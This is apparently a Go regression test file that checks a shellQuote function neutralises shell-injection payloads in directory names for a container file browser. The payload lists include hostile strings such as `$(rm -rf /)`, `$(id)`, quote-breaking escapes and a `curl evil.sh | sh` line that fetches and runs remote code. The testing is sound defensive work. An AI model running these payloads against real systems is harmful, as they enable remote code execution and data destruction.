package dockerx

import (
	"os/exec"
	"strings"
	"testing"
)

// shellQuote regression tests backing docs/SECURITY-AUDIT.md (§2). The
// container file browser embeds a user-supplied directory into
//
//	find <dir> -maxdepth 1 ... | /bin/sh -c
//
// (container_files.go:91-97). cleanContainerPath strips .. beforehand, but
// the quoting is the last line of defense against a directory name that
// still carries shell metacharacters (quotes, $(), backticks, ;, newlines),
// so it deserves direct coverage — a container root can legitimately contain
// directories named after shell payloads.

// TestShellQuoteProducesClosedSingleQuoteLiteral checks the invariant the
// exec relies on: whatever the input, the output is exactly one single-quoted
// POSIX literal — no metacharacter inside it can be interpreted by /bin/sh.
func TestShellQuoteProducesClosedSingleQuoteLiteral(t *testing.T) {
	payloads := []string{
		`/data`,
		`/dir with spaces`,
		`/it's quoted`,
		`/$(rm -rf /)`,
		"/back`tick",
		`/semi;colon`,
		`/pipe|x`,
		`/new\nline`,
		`/tab\tchar`,
		`/'$(id)'`,
		`/"; curl evil.sh | sh; "`,
		`/'\''; id #`,
	}
	for _, p := range payloads {
		got := shellQuote(p)
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") || len(got) < 2 {
			t.Fatalf("payload %q -> %q: not wrapped in single quotes", p, got)
		}
		// Inside the literal every single quote must be part of the '\'' or ''
		// escaping. shellQuote uses the '\'' + `'\''` + `'` concatenation
		// form: an embedded ' becomes ' \ ' ' (close, escaped quote, reopen).
		// Simplest robust check: feeding the output to /bin/sh must yield the
		// original string back — done below via round-trip test instead of
		// re-parsing the quoting rules here.
	}
}

// TestShellQuoteRoundTrips runs every payload through a REAL /bin/sh echo
// when available and asserts the shell sees the original bytes verbatim —
// the definitive no-injection proof. Skipped where sh is absent (Windows CI
// without Git Bash on PATH).
func TestShellQuoteRoundTrips(t *testing.T) {
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no /bin/sh on this host; literal-shape test above still covers the quoting")
	}
	payloads := []string{
		`/it's $(id)`,
		"/back`tick;rm -rf /",
		`/a'b"c;d|e&f`,
	}
	for _, p := range payloads {
		cmd := exec.Command(sh, "-c", "printf %s "+shellQuote(p))
		out, err := cmd.Output()
		if err != nil {
			t.Fatalf("payload %q: sh failed: %v", p, err)
		}
		if string(out) != p {
			t.Fatalf("payload %q did not round-trip through sh; shell saw %q (injection-shaped)", p, out)
		}
	}
}

// TestShellQuoteEscapesEveryQuote pins the exact escaping rule: every single
// quote in the input becomes '\” — never a lone ' that could close the
// literal early.
func TestShellQuoteEscapesEveryQuote(t *testing.T) {
	got := shellQuote(`a'b'c`)
	want := `'a'\''b'\''c'`
	if got != want {
		t.Fatalf("shellQuote(`a'b'c`) = %s, want %s", got, want)
	}
	if shellQuote("") != "''" {
		t.Fatalf("empty input must quote to ''")
	}
}
